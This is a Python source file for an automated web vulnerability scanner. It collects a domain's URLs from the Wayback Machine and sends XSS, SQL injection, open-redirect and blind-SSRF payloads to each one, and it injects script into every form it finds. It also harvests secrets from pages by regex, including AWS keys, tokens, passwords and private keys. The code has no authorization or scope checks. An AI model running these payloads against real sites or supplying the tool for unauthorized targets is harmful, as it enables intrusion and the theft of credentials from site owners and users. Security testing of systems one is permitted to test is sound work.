import requests
import re
import argparse
from urllib.parse import urlparse, urlencode, urljoin, quote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# Payloads and params
SSRF_PARAMS = [
    "url", "uri", "path", "continue", "data", "dest", "redirect", "next", "v", "image", "file", "link",
    "src", "load", "page", "callback", "return", "site", "open"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"'><script>alert(1)</script>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "\u003cscript\u003ealert(1)\u003c/script\u003e"
]

REDIRECT_PAYLOADS = [
    "https://google.com",
    "//google.com",
    "\\google.com",
    "/\\google.com",
    "%2f%2fgoogle.com"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "admin' --",
    "' UNION SELECT null, version() --",
    "' AND SLEEP(5) --",  # time-based
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 'a'='a",
    "') OR ('1'='1--",
    "admin' #",
    "admin'/*"
]

SENSITIVE_PATTERNS = {
    "JWT": r"eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+",
    "AWS Access Key": r"AKIA[0-9A-Z]{16}",
    "Google API Key": r"AIza[0-9A-Za-z-_]{35}",
    "Slack Token": r"xox[baprs]-([0-9a-zA-Z]{10,48})",
    "API Key": r"(?i)(api[_-]?key|token|secret|access[_-]?token|auth[_-]?token)[\"'=:\s]+([a-z0-9-_]{16,})",
    "Email": r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+",
    "Password": r"(?i)(password|pwd|pass)[\"'=:\s]+([a-zA-Z0-9@#%$!^&*]{6,})",
    "Private Key": r"-----BEGIN PRIVATE KEY-----[\s\S]+?-----END PRIVATE KEY-----",
}

HEADERS = {
    "User-Agent": "Mozilla/5.0 (VulnScannerPro/1.0)"
}

def get_wayback_urls(domain):
    urls = set()
    try:
        url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey"
        r = requests.get(url, timeout=15, headers=HEADERS)
        if r.status_code == 200:
            data = r.json()
            for entry in data[1:]:
                urls.add(entry[0])
    except Exception:
        pass
    return list(urls)

def url_exists(url):
    try:
        r = requests.head(url, timeout=8, allow_redirects=True, headers=HEADERS)
        return r.status_code == 200
    except:
        return False

def extract_forms_and_inputs(url):
    try:
        r = requests.get(url, timeout=10, headers=HEADERS)
        if "text/html" not in r.headers.get("Content-Type", ""):
            return []
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
        inputs = [tag.get("name") for tag in soup.find_all("input") if tag.get("name")]
        return [(url, form.get("action"), form.get("method", "get"), inputs) for form in forms]
    except:
        return []

def scan_ssrf(url, blind_url):
    findings = []
    for param in SSRF_PARAMS:
        try:
            base = url.split("?")[0]
            test_url = base + "?" + urlencode({param: blind_url})
            r = requests.get(test_url, timeout=10, headers=HEADERS)
            # We can't detect blindly here, rely on webhook.site manual check
            findings.append(f"{test_url}")
        except:
            pass
    return findings

def scan_xss(url):
    findings = []
    for payload in XSS_PAYLOADS:
        try:
            r = requests.get(url, params={"q": payload}, timeout=10, headers=HEADERS)
            if payload.lower() in r.text.lower():
                findings.append(f"{url}?q={quote(payload)}")
        except:
            pass
    return findings

def scan_redirect(url):
    findings = []
    for payload in REDIRECT_PAYLOADS:
        try:
            r = requests.get(url, params={"next": payload}, allow_redirects=False, timeout=10, headers=HEADERS)
            location = r.headers.get("Location", "")
            if payload in location:
                findings.append(f"{url}?next={quote(payload)}")
        except:
            pass
    return findings

def scan_sqli(url):
    findings = []
    for payload in SQLI_PAYLOADS:
        try:
            start = time.time()
            r = requests.get(url, params={"id": payload}, timeout=15, headers=HEADERS)
            duration = time.time() - start

            # Filter status codes
            if r.status_code not in [200, 500]:
                continue

            lower_text = r.text.lower()
            error_indicators = ["sql", "syntax", "mysql", "error", "warning", "unterminated"]
            # Basic error detection
            if any(e in lower_text for e in error_indicators):
                snippet_start = max(0, lower_text.find("error")-30)
                snippet = r.text[snippet_start:snippet_start+150].replace('\n', ' ').strip()
                findings.append({
                    "url": f"{url}?id={quote(payload)}",
                    "evidence": snippet
                })
            # Time-based detection: if payload contains SLEEP and response delayed >4 sec, mark it
            elif "sleep" in payload.lower() and duration > 4:
                findings.append({
                    "url": f"{url}?id={quote(payload)}",
                    "evidence": f"Response time {duration:.2f}s indicates possible blind SQLi."
                })
        except:
            pass
    return findings

def scan_sensitive_info(url):
    findings = []
    try:
        r = requests.get(url, timeout=10, headers=HEADERS)
        for name, pattern in SENSITIVE_PATTERNS.items():
            for match in re.findall(pattern, r.text):
                if isinstance(match, tuple):
                    match = match[1]
                findings.append({
                    "type": name,
                    "value": match,
                    "url": url
                })
    except:
        pass
    return findings

def scan_forms(url):
    findings = []
    for form_info in extract_forms_and_inputs(url):
        base_url, action, method, inputs = form_info
        form_url = urljoin(url, action or "")
        data = {field: XSS_PAYLOADS[0] for field in inputs}
        try:
            if method.lower() == "post":
                r = requests.post(form_url, data=data, timeout=10, headers=HEADERS)
            else:
                r = requests.get(form_url, params=data, timeout=10, headers=HEADERS)
            if XSS_PAYLOADS[0].lower() in r.text.lower():
                findings.append(form_url)
        except:
            pass
    return findings

def scan_url(url, blind):
    # Pre-check URL exists
    if not url_exists(url):
        return None

    results = {
        "ssrf": [],
        "xss": [],
        "redirect": [],
        "sqli": [],
        "sensitive": [],
        "form_xss": []
    }

    results["ssrf"] = scan_ssrf(url, blind)
    results["xss"] = scan_xss(url)
    results["redirect"] = scan_redirect(url)
    results["sqli"] = scan_sqli(url)
    results["sensitive"] = scan_sensitive_info(url)
    results["form_xss"] = scan_forms(url)

    return (url, results)

def print_findings(all_results):
    sql_found = []
    ssrf_found = []
    xss_found = []
    redirect_found = []
    sensitive_found = []
    form_xss_found = []

    for url, res in all_results:
        if not res:
            continue
        if res["ssrf"]:
            for poc in res["ssrf"]:
                ssrf_found.append(poc)
        if res["xss"]:
            for poc in res["xss"]:
                xss_found.append(poc)
        if res["redirect"]:
            for poc in res["redirect"]:
                redirect_found.append(poc)
        if res["sqli"]:
            for sqli in res["sqli"]:
                sql_found.append((sqli["url"], sqli["evidence"]))
        if res["sensitive"]:
            for sens in res["sensitive"]:
                sensitive_found.append((sens["type"], sens["value"], sens["url"]))
        if res["form_xss"]:
            for f in res["form_xss"]:
                form_xss_found.append(f)

    if sql_found:
        print("\033[1;31m[+] SQL Injection Found:\033[0m")
        for url, evidence in sql_found:
            print(f"  - {url}\n    Evidence: {evidence}\n")

    if ssrf_found:
        print("\033[1;35m[+] Possible SSRF POCs (check webhook manually):\033[0m")
        for poc in ssrf_found:
            print(f"  - {poc}")
        print()

    if xss_found:
        print("\033[1;33m[+] XSS Found:\033[0m")
        for poc in xss_found:
            print(f"  - {poc}")
        print()

    if form_xss_found:
        print("\033[1;33m[+] Form-based XSS Found:\033[0m")
        for poc in form_xss_found:
            print(f"  - {poc}")
        print()

    if redirect_found:
        print("\033[1;36m[+] Open Redirect Found:\033[0m")
        for poc in redirect_found:
            print(f"  - {poc}")
        print()

    if sensitive_found:
        print("\033[1;34m[+] Sensitive Information Found:\033[0m")
        for t, val, url in sensitive_found:
            print(f"  - [{t}] {val} (at {url})")
        print()

def main():
    parser = argparse.ArgumentParser(description="Comprehensive Vulnerability Scanner")
    parser.add_argument("domain", help="Domain to scan, e.g. https://example.com")
    parser.add_argument("--blind", help="Blind SSRF webhook.site URL for SSRF detection", required=True)
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads")
    args = parser.parse_args()

    domain = args.domain.strip().rstrip('/')
    blind_url = args.blind
    print(f"[+] Fetching URLs from Wayback for {domain} ...")
    urls = get_wayback_urls(domain)

    if not urls:
        print("[!] No URLs found from Wayback. Exiting.")
        return

    print(f"[+] Found {len(urls)} URLs. Starting scan with {args.threads} threads...\n")

    results = []
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(scan_url, url, blind_url): url for url in urls}
        for future in as_completed(futures):
            url = futures[future]
            try:
                res = future.result()
                if res:
                    results.append(res)
            except Exception as e:
                pass

    print_findings(results)

if __name__ == "__main__":
    main()
